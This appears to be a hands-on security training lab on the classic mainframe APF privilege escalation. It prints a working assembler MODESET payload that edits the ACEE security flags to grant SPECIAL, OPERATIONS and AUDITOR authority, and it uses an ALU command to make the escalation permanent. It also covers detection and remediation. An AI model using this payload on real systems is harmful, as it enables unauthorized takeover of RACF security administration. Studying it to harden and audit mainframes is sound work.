title: APF Privilege Escalation: MODESET to Superuser
description: Demonstrate the classic APF privilege escalation attack. Find a writable APF-authorized library, assemble a MODESET program that modifies the ACEE security block, and escalate to SPECIAL+OPERATIONS authority. Based on mainframed/APFPRIV.jcl.

steps.title: Attack Overview
steps.screen:
APF Privilege Escalation — The Classic Mainframe Privesc

Objective: Escalate from normal user to RACF SPECIAL+OPERATIONS
using only legitimate system functions.

Attack chain:
  1. Identify APF-authorized libraries
  2. Find one with UPDATE access
  3. Assemble a program that uses MODESET KEY=ZERO,MODE=SUP
  4. The program modifies the ACEE (security control block)
  5. Sets SPECIAL + OPERATIONS + AUDITOR flags
  6. Link-edit into the APF library with AC(1)
  7. Execute — instant superuser
  8. Run ALU to make it permanent in RACF

This is the mainframe equivalent of a kernel exploit,
except it uses DOCUMENTED, SUPPORTED system functions.
MODESET is not a bug — it's a feature for authorized programs.
steps.expected: Understand the APF privilege escalation chain before executing it.
steps.hint: APF = Authorized Program Facility. Programs in APF libraries can use MODESET to enter supervisor state — the mainframe equivalent of kernel mode.

steps.title: What is APF?
steps.screen:
APF — Authorized Program Facility

MVS has two execution modes:
  Problem State (user mode)  — normal programs
  Supervisor State (kernel)  — OS and authorized programs

APF controls which programs can use MODESET:
  1. Program must be in an APF-authorized library
  2. Program must be link-edited with AC(1)
  3. All libraries in the STEPLIB must be APF-authorized

If ALL three conditions are met:
  The program can call MODESET KEY=ZERO,MODE=SUP
  → enters supervisor state
  → can modify ANY control block in memory
  → including the ACEE (your security profile)

The vulnerability:
  If a user can WRITE to an APF library,
  they can place their own authorized program in it
  → MODESET → modify ACEE → SPECIAL authority
  → game over
steps.expected: Understand APF authorization and why writable APF libraries are critical.
steps.hint: Think of APF like Linux capabilities or Windows SeDebugPrivilege — it grants access to privileged system calls.

steps.title: Step 1: Enumerate APF Libraries
steps.screen:
READY
 LISTALC STATUS
 --DDNAME   DISP
   STEPLIB
            KEEP   SYS1.CMDLIB
   SYSPROC
            KEEP   SYSC.CMDPROC
   SYSEXEC
            KEEP   SYSC.EXEC
 READY

 APF libraries on TK5 (from SYS1.PARMLIB(IEAAPF00)):
   SYS1.LINKLIB     (system default - always APF)
   SYS1.SVCLIB      (SVC routines)
   SYS1.CMDLIB      (TSO commands)
   SYSC.LINKLIB     (community additions)

 Check: Can HERC01 write to any of these?
steps.expected: Identify APF-authorized libraries and check which ones HERC01 can write to.
steps.hint: On TK5, HERC01 often has OPERATIONS authority, which grants UPDATE access to most datasets. Check with: LISTDS 'SYS1.LINKLIB' and look at the DSORG.

steps.title: Step 2: The Assembler Payload
steps.screen:
The MODESET Payload (IBM System/370 Assembler)

       CSECT
       AMODE 31
       STM 14,12,12(13)       Save registers
       BALR 12,0               Set base register
       USING *,12
       ST 13,SAVE+4
       LA 13,SAVE
*
       MODESET KEY=ZERO,MODE=SUP    ← Enter supervisor state
*
       L 5,X'224'             ASCB pointer (PSA)
       L 5,X'6C'(5)           ASXB pointer
       L 5,X'C8'(5)           ACEE pointer ← YOUR security profile
       NI X'26'(5),X'00'      Clear flags byte
       OI X'26'(5),X'B1'      Set SPECIAL+OPER+AUDITOR
       NI X'27'(5),X'00'      Clear flags byte 2
       OI X'27'(5),X'80'      Set ALTER access
*
       L 13,SAVE+4
       LM 14,12,12(13)        Restore registers
       XR 15,15               RC=0
       BR 14                  Return
*
SAVE   DS 18F
       END
steps.expected: Understand each instruction in the privilege escalation payload.
steps.hint: MODESET KEY=ZERO,MODE=SUP is the critical instruction. After that, the program walks the control block chain: PSA → ASCB → ASXB → ACEE, then flips the authority bits.

steps.title: Step 3: The Control Block Chain
steps.screen:
Control Block Chain: PSA → ASCB → ASXB → ACEE

PSA (Prefixed Save Area) — address 0
  +X'224' → ASCB (Address Space Control Block)

ASCB — describes this address space
  +X'6C'  → ASXB (Address Space Extension Block)

ASXB — extended address space info
  +X'C8'  → ACEE (Accessor Environment Element)

ACEE — YOUR security profile in memory
  +X'26'  → Authority flags byte 1
    Bit 0: SPECIAL     (full RACF admin)
    Bit 2: OPERATIONS  (access all datasets)
    Bit 4: AUDITOR     (audit authority)
    Bit 7: (reserved)
    X'B1' = 10110001 = SPECIAL+OPER+AUDITOR

  +X'27'  → Authority flags byte 2
    Bit 0: ALTER access to all resources
    X'80' = 10000000 = ALTER

After MODESET + flag modification:
  You ARE the security administrator.
steps.expected: Trace the control block chain from PSA to ACEE and understand the flag bits.
steps.hint: The ACEE is created by RACF at logon time. Modifying it in memory gives you the authority immediately — no RACF database change needed (until you run ALU to make it permanent).

steps.title: Step 4: The Full JCL
steps.expected: Understand the three-step JCL: assemble → execute → ALU to make permanent.
steps.hint: SETCODE AC(1) marks the load module as authorized. IKJEFT01 is the TSO batch processor — ALU (ALTER USER) grants SPECIAL+OPERATIONS permanently in the RACF database.

steps.title: Step 5: Why This Works
steps.screen:
Why APF Privilege Escalation Works

1. MODESET is a DOCUMENTED macro
   - Not a bug, not an exploit
   - Intended for system programs
   - IBM documentation: 'SC28-1303'

2. APF is the ONLY gate
   - If you're in an APF library with AC(1)
   - You can use MODESET. Period.
   - No additional checks, no prompts

3. The ACEE is in writable memory
   - Once in supervisor state, all memory is writable
   - The security profile is just bytes in memory
   - Change the bytes, change your authority

4. ALU makes it permanent
   - After in-memory escalation, you have SPECIAL
   - SPECIAL lets you run ALU (ALTER USER)
   - ALU writes to the RACF database
   - Authority persists across logons

5. The only defense: PROTECT APF LIBRARIES
   - If no one can write to APF libraries → no privesc
   - On TK5/dev systems: often wide open
   - In production: this is finding #1 in every assessment
steps.expected: Understand why APF privesc is not a vulnerability but an architecture design consequence.
steps.hint: The defense is simple: don't let unprivileged users write to APF libraries. But in practice, legacy permissions, developer access, and operational convenience often leave them writable.

steps.title: Step 6: Detection
steps.screen:
Detection Opportunities

1. SMF Type 30 — Job Execution Record
   - Records STEPLIB datasets used
   - Unusual APF library references are suspicious

2. SMF Type 80 — RACF Event Record
   - ALU command is logged
   - SPECIAL/OPERATIONS grant is recorded

3. RACF SETROPTS LOGOPTIONS
   - ALWAYS log access to APF libraries
   - Monitor UPDATE access to system datasets

4. Integrity Monitoring
   - Hash/checksum APF library members
   - Alert on new or modified members

5. RACF PROGRAM Control
   - Restrict which programs can run from APF libs
   - Prevents arbitrary code in APF context
   - RARELY implemented (breaks things)

Reality: Most shops don't monitor APF library changes.
This attack has been known since the 1980s.
It still works in 2025.
steps.expected: Identify detection and prevention mechanisms for APF privilege escalation.
steps.hint: RACF PROGRAM control is the strongest defense — it restricts which load modules can execute from APF libraries. But it's complex to implement and can break legitimate applications.

steps.title: Step 7: Remediation
steps.screen:
Remediation Steps

1. Audit APF library access:
   LISTDS 'SYS1.LINKLIB'
   LISTDS 'SYSC.LINKLIB'
   Check RACF profiles: LD 'SYS1.LINKLIB' ALL

2. Restrict UPDATE access:
   PERMIT 'SYS1.**' CLASS(DATASET) ID(SYSPROG) ACCESS(UPDATE)
   PERMIT 'SYS1.**' CLASS(DATASET) ID(*) ACCESS(READ)

3. Enable RACF PROGRAM control:
   SETROPTS WHEN(PROGRAM) — restricts APF execution

4. Monitor SMF records:
   Type 30 (job execution) — check STEPLIB
   Type 80 (RACF events) — watch for ALU commands

5. Implement change management:
   All APF library changes must go through approval
   Hash-check members before and after maintenance

6. Separate dev and prod APF libraries:
   Dev systems should NOT share APF libs with prod
   Different RACF profiles, different access rules

Key insight: If you find a writable APF library
during an assessment, the system is compromised.
steps.expected: Apply remediation to prevent APF privilege escalation.
steps.hint: The single most important control: ensure no unprivileged userid has UPDATE access to any APF-authorized library. This is the #1 finding in mainframe security assessments.

steps.title: Lab Complete
steps.screen:
APF Privilege Escalation Lab Complete

Key findings:
- MODESET is a documented system macro, not an exploit
- APF authorization is the ONLY gate to supervisor state
- The ACEE (security profile) is modifiable from supervisor
- Control block chain: PSA → ASCB → ASXB → ACEE
- SPECIAL+OPERATIONS = full system control
- ALU makes in-memory escalation permanent
- Defense: restrict write access to APF libraries

Attack chain:
  Find writable APF lib → Assemble MODESET program
  → Link-edit with AC(1) → Execute → Supervisor state
  → Modify ACEE flags → SPECIAL+OPER+AUDITOR
  → ALU to make permanent → Full RACF admin

This attack has been documented since the 1980s.
It is still the #1 finding in mainframe assessments.

Source: mainframed/pentesting/APFPRIV.jcl
Credits: Soldier of FORTRAN (Philip Young)
steps.expected: Understand the complete APF privilege escalation attack chain.
steps.hint: In a real assessment, you would verify APF library write access BEFORE attempting the escalation. The attack itself takes seconds — the recon takes hours.
